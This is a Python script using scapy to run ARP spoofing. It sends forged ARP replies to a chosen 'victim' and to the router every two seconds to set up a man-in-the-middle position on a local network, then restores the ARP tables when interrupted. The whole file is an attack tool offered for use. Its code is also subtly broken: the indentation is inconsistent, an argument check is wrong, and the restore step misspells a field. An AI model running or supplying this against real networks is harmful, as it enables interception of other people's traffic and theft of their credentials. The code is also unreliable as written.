#!/usr/bin/env python
import scapy.all as scapy
import time
import sys
import optparse

def get_args():
        parser = optparse.OptionParser()
        parser.add_option("-t", "--target", dest="target_ip", help="IP of Target/Victim")
        parser.add_option("-s", "--spoof", dest="spoof_ip", help="IP of Router/Receiver")
        (value, args) = parser.parse_args()
    if not value.target_ip or value.spoof_ip:
        parser.error("[-] ERROR Missing argument, use --help or more info")
    else:
        return value

def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broad_req = broadcast/arp_req
    live = scapy.srp(arp_broad_req, timeout=1, verbose=False)[0]
    return live[0][1].hwsrc
def arpsend(target_ip, spoof_ip):
    target_addr = get_mac(target_ip)
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_addr, psrc=spoof_ip)
    scapy.send(arp_packet, verbose=False)
def arp_restore(dest_ip, src_ip):
    dest_addr = get_mac(dest_ip)
    src_addr = get_mac(src_ip)
    arp_packet = scapy.ARP(op=2, pdst=dest_ip, hwdse=dest_addr, psrc=src_ip, hwsrc=src_addr)
    scapy.send(arp_packet, verbose=False, count=4)

value = get_args()
packet_count = 0
try:
    while True:
        arpsend(value.target_ip, value.spoof_ip)
        arpsend(value.spoof_ip, value.target_ip)
        packet_count += 2
        print("\r[+] Spoofing...sent " + str(packet_count) + " packets"),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[-] Detected CTRL + C....Restoring ARP Table, Please wait....")
    arp_restore(value.target_ip, value.spoof_ip)
    arp_restore(value.spoof_ip, value.target_ip)
    print("[+] ARP Spoofing Stopped.")